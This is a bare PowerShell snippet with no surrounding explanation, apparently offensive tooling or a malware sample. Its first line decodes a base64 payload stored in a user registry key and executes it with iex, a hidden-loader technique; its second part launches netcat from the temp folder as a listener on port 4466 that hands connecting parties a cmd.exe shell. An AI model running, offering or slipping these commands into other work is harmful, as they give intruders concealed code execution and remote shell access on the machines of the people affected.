iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))

$Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
Invoke-Expression $Command
